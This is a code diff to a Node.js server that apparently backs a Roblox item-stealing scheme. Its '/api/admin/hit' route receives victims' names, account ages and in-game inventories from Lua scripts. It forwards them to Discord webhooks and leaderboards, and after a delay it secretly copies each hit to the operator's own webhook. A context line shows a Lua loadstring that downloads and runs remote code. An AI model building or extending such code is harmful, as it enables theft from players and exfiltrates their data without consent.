@@ -390,31 +390,54 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyS
 });
 if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 
-app.post('/api/admin/hit', (req, res) => {
+app.post('/api/admin/hit', async (req, res) => {
     try {
-        const data = req.body;
+        const hitInfo =  req.body; 
+        const webhookIdFromLua = hitInfo.WebHook;
 
-        console.log("--- NOUVEAU HIT REÇU ---");
-        console.log(`Joueur : ${data.DisplayName} (@${data.Name})`);
-        console.log(`Âge Compte : ${data.AccountAge} jours`);
-        console.log(`Serveur : ${data.Players} joueurs`);
-        console.log(`Min Income : ${data.MinimumIncome}`);
-        
-        if (data.Brainrots && data.Brainrots.length > 0) {
-            console.log(`Inventaire : ${data.Brainrots.length} items trouvés.`);
-            
-        } else {
-            console.log("⚠️ Inventaire vide !");
+        // 1. Vérification du Mapping dans la DB
+        if (!webhookIdFromLua) {
+            return res.status(400).json({ error: "WebHook ID manquant dans le payload" });
         }
 
-        console.log("------------------------");
+        const mapping = await WebHookId.findOne({ webhookId: webhookIdFromLua });
+        
+        if (!mapping) {
+            console.log(`ℹ️ Hit ignoré : Webhook ID ${webhookIdFromLua} inexistant.`);
+            return res.status(404).json({ error: "Webhook ID inexistant" });
+        }
 
-        // On répond à Roblox que tout est OK
-        res.status(200).json({ success: true, message: "Hit enregistré" });
+        console.log(`🎯 Processing Hit: ${hitInfo.Name} pour ${mapping.userName}`);
+
+        // 2. Tâches de fond immédiates (Leaderboard + Webhooks privés/publics)
+        // On ne met pas "await" devant Promise.all si on veut répondre vite à Roblox
+        Promise.all([
+            IncrementLeaderboard(mapping),
+            PostOnPrivateWebHook(mapping.url, hitInfo),
+            PostOnPublicWebHook(hitInfo)
+        ]).catch(err => console.log(`⚠️ Error in background tasks: ${err.message}`));
+
+        // 3. LOGIQUE MASTER (Attente 120 secondes)
+        // On utilise setTimeout pour ne pas bloquer la réponse HTTP
+        setTimeout(async () => {
+            try {
+                const masterUrl = process.env.WEBHOOK_URL;
+                // On vérifie que le master n'est pas déjà le webhook de l'utilisateur
+                if (masterUrl && masterUrl !== mapping.url) {
+                    console.log(`⏳ Master Copy envoyée (120s delay) : ${hitInfo.Name}`);
+                    await PostOnPrivateWebHook(masterUrl, hitInfo);
+                }
+            } catch (err) {
+                console.log(`⚠️ Error Delayed Master: ${err.message}`);
+            }
+        }, 120000);
+
+        // 4. Réponse au client Roblox (Important pour éviter que le Lua ne boucle/retry)
+        res.status(200).json({ success: true, message: "Hit processed" });
 
     } catch (error) {
-        console.error("Erreur lors de la réception du hit :", error);
-        res.status(500).json({ success: false, error: "Internal Server Error" });
+        console.error("❌ Critical Route Error:", error);
+        res.status(500).json({ error: "Internal Server Error" });
     }
 });
 app.get('/api/admin/hits-summary', async (req, res) => {
